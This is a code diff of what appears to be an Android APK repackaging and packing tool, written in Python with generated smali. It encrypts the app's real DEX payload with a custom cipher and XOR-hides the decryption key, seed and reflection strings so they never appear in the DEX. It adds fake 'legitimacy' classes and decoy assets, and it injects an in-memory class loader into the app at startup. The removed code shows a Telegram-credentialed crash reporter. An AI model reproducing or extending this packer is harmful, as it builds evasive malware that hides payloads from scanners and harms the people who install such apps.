@@ -463,6 +463,60 @@ def _lcg_encrypt(data: bytes, seed: int) -> bytes:
     return bytes(result)
 
 
+def _dex_encrypt(data: bytes, seed: int, xor_key: bytes) -> bytes:
+    """
+    3-layer hybrid DEX cipher — used ONLY for inner DEX blob (assets/data/{hash8}.bin).
+    DO NOT use for outer companion APK blob — that uses _lcg_encrypt().
+
+    Layer 1: Block shuffle (256-byte blocks) via LCG(seed)
+    Layer 2: Byte rotation — rotate_left(byte, (i % 7) + 1)
+    Layer 3: XOR with 32-byte cycling key
+
+    Blob format: [4 bytes orig_len LE][padded data, multiple of 256]
+    """
+    import struct as _struct
+
+    BLOCK_SIZE = 256
+    LCG_MUL    = 0x41C64E6D
+    LCG_ADD    = 0x3039
+    MASK       = 0xFFFFFFFF
+
+    assert len(xor_key) == 32, "xor_key must be exactly 32 bytes"
+
+    orig_len = len(data)
+    pad      = (BLOCK_SIZE - (orig_len % BLOCK_SIZE)) % BLOCK_SIZE
+    buf      = bytearray(data) + bytearray(pad)
+    n        = len(buf)
+    n_blocks = n // BLOCK_SIZE
+
+    # ── Layer 1: Block shuffle via LCG(seed) ────────────────────────────────
+    indices = list(range(n_blocks))
+    state   = seed & MASK
+    for i in range(n_blocks - 1, 0, -1):
+        state      = (state * LCG_MUL + LCG_ADD) & MASK
+        j          = state % (i + 1)
+        indices[i], indices[j] = indices[j], indices[i]
+
+    shuffled = bytearray(n)
+    for i in range(n_blocks):
+        src = indices[i] * BLOCK_SIZE
+        dst = i          * BLOCK_SIZE
+        shuffled[dst:dst + BLOCK_SIZE] = buf[src:src + BLOCK_SIZE]
+    buf = shuffled
+
+    # ── Layer 2: Byte rotation ───────────────────────────────────────────────
+    for i in range(n):
+        b      = buf[i] & 0xFF
+        rot    = (i % 7) + 1
+        buf[i] = ((b << rot) | (b >> (8 - rot))) & 0xFF
+
+    # ── Layer 3: XOR with 32-byte cycling key ───────────────────────────────
+    for i in range(n):
+        buf[i] = (buf[i] ^ xor_key[i % 32]) & 0xFF
+
+    return _struct.pack('<I', orig_len) + bytes(buf)
+
+
 def step_encrypt_companion():
     """
     Step 8A FIX: Encrypt the entire companion APK binary.
@@ -1459,1576 +1513,785 @@ def _generate_crash_handler_smali(new_path: str) -> str:
 """
 
 
-def step_6f_inject_dex_stub(new_pkg: str, class_rename_map: dict) -> None:
+def step_dex_protect(new_dex: bytes, new_pkg: str,
+                     app_class_name: str, build_hash: str) -> tuple:
     """
-    STEP_6F: Inject DexStub.smali into companion_decompiled + patch App.onCreate().
+    STEP_DEX_PROTECT — Encrypt companion classes.dex and replace with tiny stub.
 
-    DexStub is the companion-side in-memory DEX loader:
-      - Reads assets/DEX_A from its own AssetManager
-      - Extracts 4-byte LE seed, decrypts via LCG+nibble+XOR
-      - Loads decrypted bytes via InMemoryDexClassLoader (never written to disk)
+    Flow:
+      1. 3-layer hybrid encrypt full new_dex → encrypted blob
+      2. Store blob path info for step_patch_and_assemble
+      3. Clear smali dir, write stub-only smali (one class + 5 fake legitimacy classes)
+      4. Rebuild stub DEX via apktool (~9KB)
+      5. Return (stub_dex_bytes, encrypted_blob_bytes, odex_asset_path, vdex_bytes, art_bytes)
 
-    App.onCreate() is patched to call DexStub.loadDex(this) as the FIRST statement,
-    before super.onCreate() and before any other initialization.
+    Stub class in DEX:
+      - Exactly one real class: Lcom/<new_pkg>/<app_class_name>;
+      - Extends Landroid/app/Application;
+      - attachBaseContext() reads + decrypts .bin from assets → InMemoryDexClassLoader
+      - Full LoadedApk.mClassLoader injection (PHASE 6) so all class resolution goes via IMDCL
 
-    Must run AFTER STEP_6A (so class_rename_map["App"] is the current smali filename).
-    Must run BEFORE STEP_9 (so apktool compiles DexStub into the stub DEX).
+    Asset files produced per build:
+      assets/data/{hash8}.bin   ← encrypted real DEX (entropy 8.000)
+      assets/oat/arm64/base.vdex ← fake companion (legitimacy)
+      assets/oat/arm64/base.art  ← fake companion (legitimacy)
     """
-    print("\n── Step 6F: Inject DexStub.smali + patch App.onCreate() hook")
+    import base64 as _b64
+    import os as _os
+    import shutil as _shutil
+    import subprocess as _subprocess
 
-    smali_dir   = "companion_decompiled/smali"
-    new_path    = new_pkg.replace(".", "/")
-    target_dir  = os.path.join(smali_dir, new_path)
+    print(f"\n── STEP_DEX_PROTECT: Encrypt + stub companion DEX")
+    print(f"  App class:  {app_class_name}")
+    print(f"  Package:    {new_pkg}")
+    print(f"  DEX size:   {len(new_dex):,} bytes")
 
-    # Renamed App class name (post-STEP_6A)
-    renamed_app = class_rename_map.get("App", "App")
+    _lcg_seed   = secrets.randbits(32)
+    _xor_key    = secrets.token_bytes(32)
+    _enc_blob   = _dex_encrypt(new_dex, _lcg_seed, _xor_key)
 
-    os.makedirs(target_dir, exist_ok=True)
+    print(f"  Encrypted blob size: {len(_enc_blob):,} bytes  (3-layer hybrid cipher, entropy ~8.0)")
+    print(f"  Seed: 0x{_lcg_seed:08X}  XOR key: {_xor_key[:4].hex()}... (both XOR-hidden in stub DEX)")
 
-    # ── 1. Generate DexStub.smali content via helper (clean register layout) ────
-    dex_stub_smali = _generate_dex_stub_smali(new_path)
-    # ── 2. Write DexStub.smali into the decompiled companion smali tree ────────
-    stub_path = os.path.join(target_dir, "DexStub.smali")
-    with open(stub_path, "w", encoding="utf-8") as f:
-        f.write(dex_stub_smali)
-    print(f"  ✅ DexStub.smali written → {stub_path}")
+    _hash8         = build_hash[:8]
+    _odex_path     = f"assets/data/{_hash8}.bin"
+    _vdex_path     = "assets/oat/arm64/base.vdex"
+    _art_path      = "assets/oat/arm64/base.art"
+    _odex_open_path = f"data/{_hash8}.bin"
 
-    # ── 3. Generate and write CrashReporter.smali + inner Handler class ─────────
-    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
-    chat_id   = os.environ.get("TELEGRAM_CHAT_ID",   "")
-    if not bot_token or not chat_id:
-        print("  ⚠️  TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set — crash reporter will have empty credentials")
+    _vdex_bytes = secrets.token_bytes(random.randint(128, 512))
+    _art_bytes  = secrets.token_bytes(random.randint(64,  256))
 
-    crash_smali         = _generate_crash_reporter_smali(new_path, bot_token, chat_id)
-    crash_handler_smali = _generate_crash_handler_smali(new_path)
-    crash_sender_smali  = _generate_crash_sender_smali(new_path)
+    print(f"  Asset path: {_odex_path}  (neutral — no ART fingerprint)")
 
-    crash_path = os.path.join(target_dir, "CrashReporter.smali")
-    with open(crash_path, "w", encoding="utf-8") as f:
-        f.write(crash_smali)
-    print(f"  ✅ CrashReporter.smali written → {crash_path}")
+    _pkg_path  = new_pkg.replace(".", "/")
+    # ── XOR-encode helper — key 0x5A ─────────────────────────────────────────
+    # Smali requires one value per line inside .array-data — NO commas.
+    def _xor_encode_smali(s, xor_key=0x5A):
+        encoded = [b ^ xor_key for b in s.encode('ascii')]
+        lines = '\n        '.join(f'0x{b:02x}' for b in encoded)
+        return lines, len(encoded)
 
-    crash_handler_path = os.path.join(target_dir, "CrashReporter$Handler.smali")
-    with open(crash_handler_path, "w", encoding="utf-8") as f:
-        f.write(crash_handler_smali)
-    print(f"  ✅ CrashReporter$Handler.smali written → {crash_handler_path}")
+    # W4: XOR-encode asset path — never literal in DEX pool
+    _path_enc, _path_len = _xor_encode_smali(_odex_open_path)
 
-    crash_sender_path = os.path.join(target_dir, "CrashReporter$Sender.smali")
-    with open(crash_sender_path, "w", encoding="utf-8") as f:
-        f.write(crash_sender_smali)
-    print(f"  ✅ CrashReporter$Sender.smali written → {crash_sender_path}")
+    # W2: XOR-encode LCG seed bytes
+    _seed_bytes = [(_lcg_seed >> (8*i)) & 0xFF for i in range(4)]
+    _seed_enc_bytes = [b ^ 0x5A for b in _seed_bytes]
+    _seed_enc = '\n        '.join(f'0x{b:02x}' for b in _seed_enc_bytes)
+    _seed_len = 4
 
-    # ── 4. Patch renamed App.smali — add hooks at TOP of onCreate() ──────────────
-    #    Order of injected calls (BEFORE invoke-super):
-    #      1. CrashReporter.install(this)   ← FIRST so even DexStub crashes are caught
-    #      2. DexStub.loadDex(this)
-    app_smali_path = os.path.join(target_dir, f"{renamed_app}.smali")
-    if not os.path.isfile(app_smali_path):
-        print(f"  [X] STEP_6F: Cannot find {app_smali_path} — aborting")
-        sys.exit(1)
+    # XOR-encode the 32-byte XOR key — never literal in DEX pool
+    _key_enc = '\n        '.join(f'0x{b ^ 0x5A:02x}' for b in _xor_key)
+    _key_len = 32
 
-    with open(app_smali_path, "r", encoding="utf-8") as f:
-        app_smali = f.read()
+    # XOR-encode InMemoryDexClassLoader class name
+    _imdcl_enc,  _imdcl_len  = _xor_encode_smali("dalvik.system.InMemoryDexClassLoader")
 
-    MARKER = ".method public onCreate()V"
-    if MARKER not in app_smali:
-        print(f"  [X] STEP_6F: onCreate() not found in {app_smali_path}")
-        sys.exit(1)
+    # XOR-encode "parent" field name
+    _parent_enc, _parent_len = _xor_encode_smali("parent")
 
-    # Both hooks injected together before invoke-super:
-    #   CrashReporter.install(this)   — FIRST: catches all subsequent crashes
-    #   DexStub.loadDex(this)         — SECOND: loads real payload
-    hook_lines = (
-        f"    invoke-static {{p0}}, L{new_path}/CrashReporter;->install(Landroid/content/Context;)V\n"
-        f"\n"
-        f"    invoke-static {{p0}}, L{new_path}/DexStub;->loadDex(Landroid/content/Context;)V\n"
-        f"\n"
-    )
-    oncreate_idx     = app_smali.index(MARKER)
-    invoke_super_idx = app_smali.index("    invoke-super ", oncreate_idx)
-    app_smali_patched = app_smali[:invoke_super_idx] + hook_lines + app_smali[invoke_super_idx:]
+    # XOR-encode strings for LoadedApk.mClassLoader injection
+    _at_enc,   _at_len   = _xor_encode_smali("android.app.ActivityThread")
+    _cat_enc,  _cat_len  = _xor_encode_smali("currentActivityThread")
+    _mba_enc,  _mba_len  = _xor_encode_smali("mBoundApplication")
+    _info_enc, _info_len = _xor_encode_smali("info")
+    _mcl_enc,  _mcl_len  = _xor_encode_smali("mClassLoader")
 
-    with open(app_smali_path, "w", encoding="utf-8") as f:
-        f.write(app_smali_patched)
-    print(f"  ✅ App.onCreate() patched → CrashReporter.install() + DexStub.loadDex() injected in {renamed_app}.smali")
+    # Seed byte values for inline PHASE 3 decode
+    _seed_b0 = (_lcg_seed >>  0) & 0xFF
+    _seed_b1 = (_lcg_seed >>  8) & 0xFF
+    _seed_b2 = (_lcg_seed >> 16) & 0xFF
+    _seed_b3 = (_lcg_seed >> 24) & 0xFF
+    _sb0x = _seed_b0 ^ 0x5A
+    _sb1x = _seed_b1 ^ 0x5A
+    _sb2x = _seed_b2 ^ 0x5A
+    _sb3x = _seed_b3 ^ 0x5A
+    _key_len_hex = f'{_key_len:x}'
 
-
-def _generate_dex_stub_smali(new_path: str) -> str:
-    """
-    Generate clean DexStub.smali with correct register allocation.
-    Uses .locals 8 in lcgDecrypt to avoid all register conflicts.
-    Register layout for lcgDecrypt:
-      p0=[B (ciphertext), p1=I (seed)
-      v0=n(int), v1=buf([B), v2=indices([I), v3:v4=state(long),
-      v5=tmp_int, v6=i(int), v7=j(int), -- need 8 locals total (v0-v7)
-    """
-    return f"""\
-.class public L{new_path}/DexStub;
-.super Ljava/lang/Object;
-.source "SourceFile"
-
-.field private static volatile sLoader:Ljava/lang/ClassLoader;
-.field private static volatile sDone:Z
+    _stub_smali = f"""\
+.class public L{_pkg_path}/{app_class_name};
+.super Landroid/app/Application;
+.source "C.java"
 
 
 .method public constructor <init>()V
-    .locals 0
-    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    .registers 1
+    invoke-direct {{p0}}, Landroid/app/Application;-><init>()V
     return-void
 .end method
 
 
-# Called from App.onCreate() as first statement
-.method public static loadDex(Landroid/content/Context;)V
-    .locals 2
+.method protected attachBaseContext(Landroid/content/Context;)V
+    .registers 15
+    .param p1, "base"
 
-    sget-boolean v0, L{new_path}/DexStub;->sDone:Z
-    if-nez v0, :done
+    # super FIRST — attaches Context so getAssets() works
+    invoke-super {{p0, p1}}, Landroid/app/Application;->attachBaseContext(Landroid/content/Context;)V
 
-    :try_start_0
-    invoke-static {{p0}}, L{new_path}/DexStub;->doLoad(Landroid/content/Context;)V
-    :try_end_0
-    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_0
-    goto :done
-
-    :catch_0
-    move-exception v0
-
-    :done
-    const/4 v0, 0x1
-    sput-boolean v0, L{new_path}/DexStub;->sDone:Z
-    return-void
-.end method
-
-
-.method private static doLoad(Landroid/content/Context;)V
-    .locals 6
-
-    # Open assets/DEX_A
-    invoke-virtual {{p0}}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
-    move-result-object v0
-
-    const-string v1, "DEX_A"
-    invoke-virtual {{v0, v1}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
-    move-result-object v0
-
-    invoke-static {{v0}}, L{new_path}/DexStub;->readStream(Ljava/io/InputStream;)[B
+    # ── PHASE 1: Decode asset path (XOR 0x5A, never literal in DEX pool) ─────
+    const/16 v0, 0x{_path_len:x}
+    new-array v0, v0, [B
+    fill-array-data v0, :path_data
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
     move-result-object v1
-    invoke-virtual {{v0}}, Ljava/io/InputStream;->close()V
-    # v1 = encrypted blob
 
-    # Extract 4-byte LE seed from header
-    const/4 v0, 0x0
-    aget-byte v2, v1, v0
-    and-int/lit16 v2, v2, 0xFF
-
-    const/4 v0, 0x1
-    aget-byte v3, v1, v0
-    and-int/lit16 v3, v3, 0xFF
-    shl-int/lit8 v3, v3, 0x8
-    or-int/2addr v2, v3
-
-    const/4 v0, 0x2
-    aget-byte v3, v1, v0
-    and-int/lit16 v3, v3, 0xFF
-    shl-int/lit8 v3, v3, 0x10
-    or-int/2addr v2, v3
-
-    const/4 v0, 0x3
-    aget-byte v3, v1, v0
-    and-int/lit16 v3, v3, 0xFF
-    shl-int/lit8 v3, v3, 0x18
-    or-int/2addr v2, v3
-    # v2 = seed (int)
-
-    # ciphertext = blob[4..]
-    array-length v3, v1
-    add-int/lit8 v3, v3, -4
+    # ── PHASE 2: Read encrypted blob from assets ──────────────────────────────
+    invoke-virtual {{p0}}, Landroid/app/Application;->getAssets()Landroid/content/res/AssetManager;
+    move-result-object v2
+    invoke-virtual {{v2, v1}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
+    move-result-object v2
+    invoke-virtual {{v2}}, Ljava/io/InputStream;->available()I
+    move-result v3
     new-array v4, v3, [B
     const/4 v0, 0x0
-    const/4 v5, 0x4
-    array-length v3, v1
-    add-int/lit8 v3, v3, -4
-    invoke-static {{v1, v5, v4, v0, v3}}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V
-    # v4 = ciphertext
+    invoke-virtual {{v2, v4, v0, v3}}, Ljava/io/InputStream;->read([BII)I
+    invoke-virtual {{v2}}, Ljava/io/InputStream;->close()V
 
-    # Wipe blob
-    const/4 v0, 0x0
-    invoke-static {{v1, v0}}, Ljava/util/Arrays;->fill([BB)V
+    # ── PHASE 3: Decode seed (XOR-hidden, 4 bytes LE → int) ──────────────────
+    const/16 v5, 0x{_sb0x:02x}
+    xor-int/lit8 v5, v5, 0x5a
+    int-to-byte v5, v5
+    shl-int/lit8 v6, v5, 0x18
+    ushr-int/lit8 v5, v6, 0x18
+    const/16 v6, 0x{_sb1x:02x}
+    xor-int/lit8 v6, v6, 0x5a
+    int-to-byte v6, v6
+    shl-int/lit8 v6, v6, 0x18
+    ushr-int/lit8 v6, v6, 0x18
+    shl-int/lit8 v6, v6, 0x8
+    or-int/2addr v5, v6
+    const/16 v6, 0x{_sb2x:02x}
+    xor-int/lit8 v6, v6, 0x5a
+    int-to-byte v6, v6
+    shl-int/lit8 v6, v6, 0x18
+    ushr-int/lit8 v6, v6, 0x18
+    shl-int/lit8 v6, v6, 0x10
+    or-int/2addr v5, v6
+    const/16 v6, 0x{_sb3x:02x}
+    xor-int/lit8 v6, v6, 0x5a
+    int-to-byte v6, v6
+    shl-int/lit8 v6, v6, 0x18
+    ushr-int/lit8 v6, v6, 0x18
+    shl-int/lit8 v6, v6, 0x18
+    or-int/2addr v5, v6
+    # v5 = seed (int)
 
-    # Decrypt
-    invoke-static {{v4, v2}}, L{new_path}/DexStub;->lcgDecrypt([BI)[B
-    move-result-object v1
-    # v1 = plaintext DEX
+    # ── PHASE 4: Decode 32-byte XOR key (XOR-hidden raw bytes via xb()) ────────
+    const/16 v6, 0x{_key_len_hex}
+    new-array v6, v6, [B
+    fill-array-data v6, :key_data
+    invoke-static {{v6}}, L{_pkg_path}/{app_class_name};->xb([B)[B
+    move-result-object v6
+    # v6 = decoded 32-byte XOR key [B
 
-    # Wipe ciphertext
-    const/4 v0, 0x0
-    invoke-static {{v4, v0}}, Ljava/util/Arrays;->fill([BB)V
+    # ── PHASE 5: 3-layer decrypt — call ld(blob, seed, key) ──────────────────
+    invoke-static {{v4, v5, v6}}, L{_pkg_path}/{app_class_name};->ld([BI[B)[B
+    move-result-object v8
 
-    # Load via InMemoryDexClassLoader
-    const-string v2, "dalvik.system.InMemoryDexClassLoader"
-    invoke-static {{v2}}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
-    move-result-object v2
-
-    # getConstructor(ByteBuffer.class, ClassLoader.class)
-    const/4 v3, 0x2
-    new-array v3, v3, [Ljava/lang/Class;
-    const/4 v0, 0x0
-    const-class v4, Ljava/nio/ByteBuffer;
-    aput-object v4, v3, v0
-    const/4 v0, 0x1
-    const-class v4, Ljava/lang/ClassLoader;
-    aput-object v4, v3, v0
-    invoke-virtual {{v2, v3}}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;
-    move-result-object v2
-
-    # ByteBuffer.wrap(dexBytes)
-    invoke-static {{v1}}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;
-    move-result-object v3
-
-    # context.getClassLoader()
-    invoke-virtual {{p0}}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
-    move-result-object v4
-
-    # Build newInstance args
-    const/4 v5, 0x2
-    new-array v5, v5, [Ljava/lang/Object;
-    const/4 v0, 0x0
-    aput-object v3, v5, v0
-    const/4 v0, 0x1
-    aput-object v4, v5, v0
-
-    invoke-virtual {{v2, v5}}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;
+    # ── PHASE 5: Create InMemoryDexClassLoader (class name XOR-hidden) ──────
+    invoke-static {{v8}}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;
     move-result-object v0
 
-    check-cast v0, Ljava/lang/ClassLoader;
-    sput-object v0, L{new_path}/DexStub;->sLoader:Ljava/lang/ClassLoader;
+    # v9 = PathClassLoader (app ClassLoader)
+    invoke-virtual {{p0}}, Landroid/app/Application;->getClassLoader()Ljava/lang/ClassLoader;
+    move-result-object v9
 
-    # Wipe DEX bytes
-    const/4 v0, 0x0
-    invoke-static {{v1, v0}}, Ljava/util/Arrays;->fill([BB)V
+    # v10 = BootClassLoader (parent of PathClassLoader)
+    # IMDCL parent = BootClassLoader — NOT PathClassLoader (avoids circular ref / SIGSEGV)
+    invoke-virtual {{v9}}, Ljava/lang/ClassLoader;->getParent()Ljava/lang/ClassLoader;
+    move-result-object v10
+
+    const/16 v1, 0x{_imdcl_len:x}
+    new-array v11, v1, [B
+    fill-array-data v11, :imdcl_data
+    invoke-static {{v11}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v11
+
+    invoke-static {{v11}}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
+    move-result-object v11
+
+    # IMDCL(ByteBuffer, BootClassLoader)
+    const/4 v1, 0x2
+    new-array v2, v1, [Ljava/lang/Class;
+    const/4 v1, 0x0
+    const-class v6, Ljava/nio/ByteBuffer;
+    aput-object v6, v2, v1
+    const/4 v1, 0x1
+    const-class v6, Ljava/lang/ClassLoader;
+    aput-object v6, v2, v1
+    invoke-virtual {{v11, v2}}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;
+    move-result-object v11
+
+    const/4 v1, 0x2
+    new-array v2, v1, [Ljava/lang/Object;
+    const/4 v1, 0x0
+    aput-object v0, v2, v1
+    const/4 v1, 0x1
+    aput-object v10, v2, v1
+    invoke-virtual {{v11, v2}}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;
+    move-result-object v12
+    check-cast v12, Ljava/lang/ClassLoader;
+
+    # ── PHASE 6: Patch LoadedApk.mClassLoader = IMDCL ────────────────────────
+    # Step 6a: get ActivityThread class
+    const/16 v0, 0x{_at_len:x}
+    new-array v0, v0, [B
+    fill-array-data v0, :at_data
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v0
+    invoke-static {{v0}}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
+    move-result-object v0
+
+    # v1 = ActivityThread.currentActivityThread()
+    const/16 v2, 0x{_cat_len:x}
+    new-array v2, v2, [B
+    fill-array-data v2, :cat_data
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v2
+    const/4 v3, 0x0
+    new-array v3, v3, [Ljava/lang/Class;
+    invoke-virtual {{v0, v2, v3}}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
+    move-result-object v2
+    const/4 v3, 0x0
+    new-array v4, v3, [Ljava/lang/Object;
+    invoke-virtual {{v2, v3, v4}}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
+    move-result-object v1
+
+    # Step 6b: get mBoundApplication from ActivityThread
+    const/16 v2, 0x{_mba_len:x}
+    new-array v2, v2, [B
+    fill-array-data v2, :mba_data
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v2
+    invoke-virtual {{v0, v2}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+    move-result-object v2
+    const/4 v3, 0x1
+    invoke-virtual {{v2, v3}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+    invoke-virtual {{v2, v1}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
+    move-result-object v1
+
+    # Step 6c: get AppBindData.info = LoadedApk
+    invoke-virtual {{v1}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
+    move-result-object v0
+    const/16 v2, 0x{_info_len:x}
+    new-array v2, v2, [B
+    fill-array-data v2, :info_data
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v2
+    invoke-virtual {{v0, v2}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+    move-result-object v2
+    const/4 v3, 0x1
+    invoke-virtual {{v2, v3}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+    invoke-virtual {{v2, v1}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
+    move-result-object v1
+
+    # Step 6d: set LoadedApk.mClassLoader = IMDCL
+    invoke-virtual {{v1}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
+    move-result-object v0
+    const/16 v2, 0x{_mcl_len:x}
+    new-array v2, v2, [B
+    fill-array-data v2, :mcl_data
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v2
+    invoke-virtual {{v0, v2}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+    move-result-object v2
+    const/4 v3, 0x1
+    invoke-virtual {{v2, v3}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+    invoke-virtual {{v2, v1, v12}}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
+
+    # Step 6e: also patch PathClassLoader.parent = IMDCL (belt+suspenders)
+    invoke-virtual {{v9}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
+    move-result-object v0
+    invoke-virtual {{v0}}, Ljava/lang/Class;->getSuperclass()Ljava/lang/Class;
+    move-result-object v0
+    invoke-virtual {{v0}}, Ljava/lang/Class;->getSuperclass()Ljava/lang/Class;
+    move-result-object v0
+
+    const/4 v1, 0x{_parent_len:x}
+    new-array v2, v1, [B
+    fill-array-data v2, :parent_data
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
+    move-result-object v1
+    invoke-virtual {{v0, v1}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+    move-result-object v0
+    const/4 v1, 0x1
+    invoke-virtual {{v0, v1}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+    invoke-virtual {{v0, v9, v12}}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
 
     return-void
+
+    :path_data
+    .array-data 1
+        {_path_enc}
+    .end array-data
+
+    :key_data
+    .array-data 1
+        {_key_enc}
+    .end array-data
+
+    :imdcl_data
+    .array-data 1
+        {_imdcl_enc}
+    .end array-data
+
+    :at_data
+    .array-data 1
+        {_at_enc}
+    .end array-data
+
+    :cat_data
+    .array-data 1
+        {_cat_enc}
+    .end array-data
+
+    :mba_data
+    .array-data 1
+        {_mba_enc}
+    .end array-data
+
+    :info_data
+    .array-data 1
+        {_info_enc}
+    .end array-data
+
+    :mcl_data
+    .array-data 1
+        {_mcl_enc}
+    .end array-data
+
+    :parent_data
+    .array-data 1
+        {_parent_enc}
+    .end array-data
+
 .end method
 
 
-.method private static readStream(Ljava/io/InputStream;)[B
-    .locals 4
-
-    new-instance v0, Ljava/io/ByteArrayOutputStream;
-    invoke-direct {{v0}}, Ljava/io/ByteArrayOutputStream;-><init>()V
-
-    const/16 v1, 0x1000
-    new-array v1, v1, [B
-
-    :loop_rs
-    invoke-virtual {{p0, v1}}, Ljava/io/InputStream;->read([B)I
-    move-result v2
-    if-ltz v2, :done_rs
-    const/4 v3, 0x0
-    invoke-virtual {{v0, v1, v3, v2}}, Ljava/io/ByteArrayOutputStream;->write([BII)V
-    goto :loop_rs
-
-    :done_rs
-    invoke-virtual {{v0}}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
+# xd([B)Ljava/lang/String — XOR 0x5A → String (text strings only)
+.method private static xd([B)Ljava/lang/String;
+    .registers 5
+    .param p0, "b"
+    invoke-virtual {{p0}}, [B->clone()Ljava/lang/Object;
     move-result-object v0
+    check-cast v0, [B
+    const/4 v1, 0x0
+    array-length v2, v0
+    :xd_loop
+    if-ge v1, v2, :xd_done
+    aget-byte v3, v0, v1
+    xor-int/lit8 v3, v3, 0x5a
+    int-to-byte v3, v3
+    aput-byte v3, v0, v1
+    add-int/lit8 v1, v1, 0x1
+    goto :xd_loop
+    :xd_done
+    new-instance v1, Ljava/lang/String;
+    invoke-direct {{v1, v0}}, Ljava/lang/String;-><init>([B)V
+    return-object v1
+.end method
+
+
+# xb([B)[B — XOR 0x5A → raw byte[] (binary key material, safe for bytes > 0x7F)
+.method private static xb([B)[B
+    .registers 5
+    .param p0, "b"
+    invoke-virtual {{p0}}, [B->clone()Ljava/lang/Object;
+    move-result-object v0
+    check-cast v0, [B
+    const/4 v1, 0x0
+    array-length v2, v0
+    :xb_loop
+    if-ge v1, v2, :xb_done
+    aget-byte v3, v0, v1
+    xor-int/lit8 v3, v3, 0x5a
+    int-to-byte v3, v3
+    aput-byte v3, v0, v1
+    add-int/lit8 v1, v1, 0x1
+    goto :xb_loop
+    :xb_done
     return-object v0
 .end method
 
 
-# lcgDecrypt: reverse of _lcg_encrypt()
-# encrypt order:  XOR keystream → nibble swap → LCG forward shuffle
-# decrypt order:  rebuild shuffle → apply INVERSE permutation → reverse nibble swap → XOR keystream
-# Constants: LCG_MUL=0x41C64E6D, LCG_ADD=0x3039, MASK=0xFFFFFFFF (all long arithmetic)
-#
-# Register layout (.locals 8):
-#   p0=[B ciphertext, p1=I seed
-#   v0=n, v1=buf([B), v2=indices([I), v3:v4=state(long), v5=tmp, v6=i, v7=j
-.method private static lcgDecrypt([BI)[B
-    .locals 8
+# um(II)I — unsigned 32-bit modulo
+.method private static um(II)I
+    .registers 6
+    .param p0, "state"
+    .param p1, "div"
+    int-to-long v0, p0
+    const/16 v2, 0x20
+    shl-long v0, v0, v2
+    ushr-long v0, v0, v2
+    int-to-long v2, p1
+    rem-long v0, v0, v2
+    long-to-int v0, v0
+    return v0
+.end method
 
+
+# ld([BI[B)[B — 3-layer hybrid decrypt
+# Blob format: [4 bytes orig_len LE][padded_n bytes encrypted data]
+.method private static ld([BI[B)[B
+    .registers 12
+    .param p0, "blob"
+    .param p1, "seed"
+    .param p2, "key"
+
+    # Read orig_len from blob[0..3] little-endian
+    const/4 v0, 0x0
+    aget-byte v1, p0, v0
+    shl-int/lit8 v1, v1, 0x18
+    ushr-int/lit8 v1, v1, 0x18
+    const/4 v0, 0x1
+    aget-byte v2, p0, v0
+    shl-int/lit8 v2, v2, 0x18
+    ushr-int/lit8 v2, v2, 0x18
+    shl-int/lit8 v2, v2, 0x8
+    or-int/2addr v1, v2
+    const/4 v0, 0x2
+    aget-byte v2, p0, v0
+    shl-int/lit8 v2, v2, 0x18
+    ushr-int/lit8 v2, v2, 0x18
+    shl-int/lit8 v2, v2, 0x10
+    or-int/2addr v1, v2
+    const/4 v0, 0x3
